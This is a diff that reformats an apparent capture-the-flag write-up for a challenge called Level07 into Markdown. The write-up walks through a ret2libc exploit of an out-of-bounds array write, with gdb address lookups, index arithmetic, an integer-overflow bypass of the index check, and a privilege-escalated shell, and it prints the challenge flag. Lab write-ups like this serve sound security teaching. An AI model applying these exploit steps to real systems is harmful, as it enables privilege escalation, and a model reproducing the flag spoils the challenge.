@@ -1,45 +1,57 @@
-so the program take 3 argument 
- - store 
- - read 
- - quit
+# Level07 Write-up
 
+## Introduction
 
- so actually the goal is to exploit this line :
+The program takes 3 arguments:
+- `store`
+- `read`
+- `quit`
 
-  *(_DWORD *)(buffer_main + 4 * index) = unum;
+## Vulnerability
 
+Actually, the goal is to exploit this line:
 
-  the problem here is because is make a 4 * index is posssible to write everywhere !
+```c
+*(_DWORD *)(buffer_main + 4 * index) = unum;
+```
 
-  so how to write the addres of the eip ?
+The problem here is that because it makes `4 * index`, it's possible to write everywhere!
 
+So how to write the address of the EIP?
 
-and which i iwant to put inside the addres ?
+And which address do I want to put inside?
 
-the problem in this chall is this code:
+## Anti-Exploitation Measures
 
-  for (; *argv_local != (char *)0; argv_local++) {
-    memset(*argv_local, 0, strlen(*argv_local));
-  }
-  for (; *env_local != (char *)0x0; env_local++) {
-    memset(*env_local, 0, strlen(*env_local));
-  }
+The problem in this challenge is this code:
 
-is delete every env and every arg 
+```c
+for (; *argv_local != (char *)0; argv_local++) {
+  memset(*argv_local, 0, strlen(*argv_local));
+}
+for (; *env_local != (char *)0x0; env_local++) {
+  memset(*env_local, 0, strlen(*env_local));
+}
+```
 
-for this reason the only possible exploit is to use ret2libc
+It deletes every environment variable and every argument.
 
+For this reason, the only possible exploit is to use ret2libc.
 
-is technique that use the already stuff inside the libc to my custom exploit
+## Ret2libc Technique
 
+This is a technique that uses the already existing stuff inside libc for a custom exploit.
 
-so what the addres i need :
-
-i use this website for find how to use ret2libc:
+I used this website to find how to use ret2libc:
 https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
 
+## Finding Required Addresses
 
+So what addresses do I need:
 
+### System Address
+
+```gdb
 (gdb) info function system
 All functions matching regular expression "system":
 
@@ -47,30 +59,35 @@ Non-debugging symbols:
 0xf7e6aed0  __libc_system
 0xf7e6aed0  system
 0xf7f48a50  svcerr_systemerr
+```
 
+The address of system is `0xf7e6aed0`.
 
-the the addres of system is 0xf7e6aed0
+### Exit Address
 
+```gdb
 (gdb) info function exit
 All functions matching regular expression "exit":
 
 Non-debugging symbols:
 0xf7e5eb70  exit
+```
 
+And the address of exit is `0xf7e5eb70`.
 
-and the addres of exit is 0xf7e5eb70
+### /bin/sh String Address
 
-the last things is where is the adress of the string 
-/bin/bash
-or /bin/sh
+The last thing is where is the address of the string `/bin/bash` or `/bin/sh`.
 
-the solution is to watch inside the mapping of the libc :
+The solution is to look inside the mapping of libc:
 
-
+```gdb
 info proc mapping
+```
 
-and after to watch in the range ins the mapping :
+And after that, look in the range inside the mapping:
 
+```gdb
 (gdb) info proc mapping
 process 1767
 Mapped address spaces:
@@ -91,42 +108,39 @@ Mapped address spaces:
         0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
         0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
         0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+```
 
+So here the address of the start and the end is known:
 
-
-so here the addres of the start and the end is know nown :
-
+```gdb
 (gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
 0xf7f897ec
+```
 
+The address is `0xf7f897ec`.
 
-the addres is 0xf7f897ec
+## Summary of Addresses
 
+- Address string `/bin/sh`: `0xf7f897ec`
+- Address exit: `0xf7e5eb70`
+- Address of system: `0xf7e6aed0`
 
+## Stack Layout
 
-adress string /bin/sh : 0xf7fd0000
-addres exit :0xf7e5eb70
-adress of system: 0xf7e6aed0
+So now I know which value I need to put, but where?
 
+So the first argument is on:
 
-so know i know wich value i need to put 
-but where ?
+- Base of the stack for the return address: here `EBP + 4` to overwrite the EIP address
+- After that, I need the address of the return: here the next `EBP + 8`
+- After that, I need the address of the first argument for system: here `EBP + 12`
 
+So:
+- `system` -> `$ebp + 4`
+- `exit` -> `$ebp + 8`
+- `/bin/sh` -> `$ebp + 12`
 
-so the first argument is on 
-
-
-base of the stack for the return of addres here EBP + 4 to everrie the eip address 
-after is need the addres of the return here the enxt EBP + 8 
-after i need the adress of the first argument for system here EBP + 12
-
-
-
-system -> $ebp + 4
-exit   -> $ebp + 8
-/bin/sh -> $ebp + 12
-
-
+```gdb
 (gdb) x/x $ebp + 4
 0xffffd71c:     0xf7e45513
 
@@ -135,41 +149,47 @@ exit   -> $ebp + 8
 
 (gdb) x/x $ebp + 12
 0xffffd724:     0xffffd7b4
+```
 
+## Finding the Buffer Address
 
+The last element is I need the index, so how to know the address:
 
-the last element is i need index so how to know the adress :
-so i look the code source i asm 
+So I look at the source code in assembly:
 
-
+```assembly
 lea     eax, [esp+36]
 mov     [esp], eax
 call    store_number
+```
 
+So the buffer is at address `esp+36`.
 
-so the buffer is on addres esp+36
-
+```gdb
 (gdb) x/x $esp+0x24
 0xffffd554:     0x00000000
+```
 
+## Calculating Indexes
 
+So now I just need to subtract with the value I want:
 
-
-so know i just need to subtract with the value i want 
-
+```
 0xffffd71c - 0xffffd554 =  0x1c8 / 4 = > 114  for $ebp+4  system
 0xffffd720 - 0xffffd554 =  0x1cc / 4 = > 115  for $ebp+8  exit
 0xffffd724 - 0xffffd554 =  0x1d0 / 4 = > 116  for $ebp+12 argument
+```
 
+With values:
+- Address of system: `0xf7e6aed0` VALUE `4159090384`
+- Address exit: `0xf7e5eb70` VALUE `4159040368`
+- Address string `/bin/sh`: `0xf7f897ec` VALUE `4160264172`
 
-with value =>
-adress of system      : 0xf7e6aed0 VALUE  4159090384
-addres exit           : 0xf7e5eb70 VALUE  4159040368
-adress string /bin/sh : 0xf7f897ec VALUE  4160264172
+## Testing
 
+Let's try:
 
-
-let's trys 
+```
  Number: 4160264172
  Index: 114
  *** ERROR! ***
@@ -177,25 +197,31 @@ let's trys
  *** ERROR! ***
  Failed to do store command
 Input command: 
+```
 
+But I found this error!
 
+## Bypassing the Index Check
 
-but i found this error !
-so  acutlly is make * 4 so is juste make bit shift of left of 2
+So actually, it makes `* 4`, so it just makes a bit shift left of 2.
 
-so *4 is same of <<2
+So `*4` is the same as `<<2`.
 
-so juste make the number with negatif integer by add one bit on bit 32 
+So just make the number with a negative integer by adding one bit on bit 32.
 
-so 114 / 4 is now 2147483762
-same for the reste 
+So `114 / 4` is now `2147483762`.
 
+Same for the rest:
+
+```
 2147483762   -> 4159090384
 115          -> 4159040368
 116          -> 4160264172
+```
 
+## Exploitation
 
-
+```
 Input command: store 
  Number: 4159090384
  Index: 2147483762
@@ -207,9 +233,10 @@ Input command: store
 Input command: quit
 $ id
 uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
+```
 
+## Flag
 
-=== Flag ===
- 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
-
- and found the flag !
+```
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
